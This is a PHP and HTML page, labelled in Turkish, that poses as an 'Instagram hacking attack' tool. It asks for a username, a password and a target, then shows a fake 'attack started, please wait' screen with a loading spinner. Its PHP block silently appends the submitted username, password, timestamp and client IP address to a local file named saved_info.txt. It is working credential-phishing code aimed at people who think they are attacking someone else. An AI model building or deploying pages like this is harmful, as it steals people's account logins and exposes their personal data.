<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['saldiri'])) {

$save = fopen("saved_info.txt","a+");
$username = $_POST['username'];
$password = $_POST['password'];
$saldiri = $_POST['saldiri'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$vericekilen = ("
+-+-+ İNSTAGRAM ATTACK +-+-+

 Tarih         : ".$tarih."
 
 İp Adresi     : ".$ipaddress."

 Kullanıcı Adı : ".$username."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$vericekilen);
fclose($save);
//echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";

}
//*/
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-top: 16px solid #8ddb34;
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
<meta charset="UTF-8">
<link rel="icon" href="https://www.flaticon.com/premium-icon/icons/svg/2175/2175198.svg" type="image/x-icon" />
<title>İNSTAGRAM HACKİNG ATTACK</title>
<style>
		* { margin: 0; padding: 0; }
		
		html { 
			background: url(https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1050&q=80) no-repeat center center fixed; 
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: cover;
		}
		
		#page-wrap { width: 400px; margin: 50px auto; padding: 20px; background: white; -moz-box-shadow: 0 0 20px black; -webkit-box-shadow: 0 0 20px black; box-shadow: 0 0 20px black; }
		p { font: 15px/2 Georgia, Serif; margin: 0 0 30px 0; text-indent: 40px; }
	</style>
</head>
<body>
<br>
<br>
<br>
<br>
<h3 style="color:#31a607; font-family: courier; font-weight: bold;">[✓] SALDIRI İŞLEMİ BAŞLATILDI</h3>
<br>
<h4 style="color:white; font-family: courier; font-weight: bold;">LÜTFEN BEKLEYİNİZ..</h4>
<div class="loader"></div>
</body>
</html>


